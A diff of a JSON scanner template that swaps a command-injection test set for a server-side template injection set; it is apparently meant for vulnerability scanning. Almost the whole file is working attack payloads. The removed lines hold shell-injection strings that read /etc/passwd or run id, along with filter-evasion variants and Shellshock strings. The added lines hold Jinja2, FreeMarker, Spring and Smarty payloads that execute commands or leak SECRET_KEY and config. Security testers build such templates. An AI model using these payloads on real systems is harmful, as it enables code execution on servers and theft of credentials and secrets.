@@ -1,156 +1,21 @@
 [
   {
-    "id": "rce-basic",
+    "id": "ssti-basic",
     "info": {
-      "name": "Remote Code Execution - Basic Tests",
+      "name": "Server-Side Template Injection",
       "severity": "critical",
-      "category": "code-execution",
-      "description": "Tests for remote code execution vulnerabilities",
+      "category": "injection",
+      "description": "Tests for SSTI vulnerabilities across multiple template engines",
       "references": [
-        "https://owasp.org/www-community/attacks/Code_Injection"
+        "https://portswigger.net/web-security/server-side-template-injection"
       ],
       "tags": [
-        "rce",
-        "code-execution",
-        "command-injection"
+        "ssti",
+        "template-injection",
+        "rce"
       ]
     },
     "payloads": [
-      {
-        "value": "; ls -la",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": "| whoami",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": "`id`",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": "$(cat /etc/passwd)",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": "&& cat /etc/passwd",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": "; id;",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": "|| whoami",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": "& ping -c 10 127.0.0.1 &",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": "`ping -c 10 127.0.0.1`",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": "$(ping -c 10 127.0.0.1)",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": ";sleep 5;",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": "|sleep 5|",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": "`sleep 5`",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": "$(sleep 5)",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": ";{sleep,5};",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": ";$IFS$9id",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": ";cat</etc/passwd",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": ";{cat,/etc/passwd}",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": ";cat${IFS}/etc/passwd",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": ";c\\at /etc/passwd",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": ";c'a't /etc/passwd",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": ";c\"a\"t /etc/passwd",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": ";$(id>/tmp/a)$(cat</tmp/a)",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": ";w\\h\\o\\a\\m\\i",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": "${@print(shell_exec($_GET[c]))}",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": "() { :;}; /bin/bash -c 'id'",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": "() { :; }; echo vulnerable",
-        "encoding": "none",
-        "method": "GET"
-      },
       {
         "value": "{{7*7}}",
         "encoding": "none",
@@ -158,31 +23,6 @@
       },
       {
         "value": "${7*7}",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": "{{config.items()}}",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": "{{''.__class__.__mro__[1].__subclasses__()}}",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": "{{''.class.mro()[1].subclasses()}}",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": "${{<%[%'\"}}%\\",
-        "encoding": "none",
-        "method": "GET"
-      },
-      {
-        "value": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
         "encoding": "none",
         "method": "GET"
       },
@@ -195,6 +35,136 @@
         "value": "%{7*7}",
         "encoding": "none",
         "method": "GET"
+      },
+      {
+        "value": "{{7*'7'}}",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "{{config}}",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "{{config.items()}}",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "{{settings.SECRET_KEY}}",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "{{''.__class__.__mro__[1].__subclasses__()}}",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "{%for c in [1,2,3]%}{{c,c,c}}{%endfor%}",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "{{request.environ}}",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "${{7*7}}",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "@(7*7)",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "#{7*7}",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "*{7*7}",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "${7*7}${7*7}",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "<%= 7*7 %>",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "[#assign ex=\"freemarker.template.utility.Execute\"?new()]${ex(\"id\")}",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(\" \")}",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "{php}echo `id`;{/php}",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "${{<%[%'\"}}%\\",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "{{self}}",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "{{lipsum.__globals__}}",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "{{''.class.mro()[1].subclasses()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}",
+        "encoding": "none",
+        "method": "GET"
       }
     ],
     "matchers": [
@@ -202,10 +172,11 @@
         "type": "response_body",
         "condition": "contains",
         "patterns": [
+          "49",
+          "7777777",
           "uid=",
-          "gid=",
           "root:x:",
-          "drwxr"
+          "__subclasses__"
         ]
       }
     ]
